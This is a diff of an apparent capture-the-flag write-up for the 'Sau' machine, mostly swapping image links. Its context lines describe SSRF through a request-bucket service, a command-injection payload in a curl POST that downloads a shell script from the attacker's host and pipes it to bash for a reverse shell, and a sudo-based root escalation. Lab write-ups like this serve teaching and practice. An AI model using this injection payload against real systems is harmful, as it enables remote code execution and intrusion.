@@ -23,19 +23,19 @@ Port 80 is being filtered, while port 55555 is open.
 
 Port 55555 hosted an application that is able to collect and inspect HTTP requests:
 
-![](<../../.gitbook/assets/image%20(3310).png>)
+![](../../.gitbook/assets/sau-6.png)
 
 We can create one by clicking on create:
 
-![](<../../.gitbook/assets/image%20(1199).png>)
+![](../../.gitbook/assets/sau-2.png)
 
 Tihs acts similar to a webhook, and is able to retrieve requests sent to that unique URL.
 
-![](<../../.gitbook/assets/image%20(1200).png>)
+![](../../.gitbook/assets/sau-3.png)
 
 We are able to set the Responses from the website. as well as where the traffic is being forwarded to, just like we can with Webhooks. Setting the Forward URL to our own HTTP server results in requests being sent there from the machine.
 
-![](<../../.gitbook/assets/image%20(1194).png>)
+![](../../.gitbook/assets/sau-1.png)
 
 Since port 80 was being filtered, we can set it to `http://localhost` and try setting all the options to True. Afterwards, sending GET requests to our bucket would result in HTML being returned:
 
@@ -61,7 +61,7 @@ $ curl -X POST --data 'username=;`curl 10.10.14.31/shell.sh|bash`' http://10.129
 
 We would get a reverse shell as `puma`:
 
-![](<../../.gitbook/assets/image%20(2380).png>)
+![](../../.gitbook/assets/sau-5.png)
 
 ## Privilege Escalation
 
@@ -81,6 +81,6 @@ User puma may run the following commands on sau:
 
 This is easily exploitable to get a `root` shell:
 
-![](<../../.gitbook/assets/image%20(1460).png>)
+![](../../.gitbook/assets/sau-4.png)
 
 Rooted!
